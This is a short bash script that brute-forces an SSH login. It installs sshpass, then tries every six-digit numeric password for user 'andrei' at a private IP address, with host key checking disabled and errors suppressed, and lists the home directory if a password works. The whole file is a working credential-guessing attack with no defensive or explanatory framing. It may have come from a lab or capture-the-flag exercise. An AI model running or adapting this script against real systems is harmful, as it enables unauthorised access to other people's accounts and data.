#!/bin/bash

apt install sshpass ssh-client -y &> /dev/null;

HOST="172.16.44.183"
USER="andrei"

for PASS in $(seq -w 000000 999999); do
	echo $PASS
	sshpass -p "$PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=0 "$USER@$HOST" "ls -lisah /home/andrei" 2> /dev/null
done
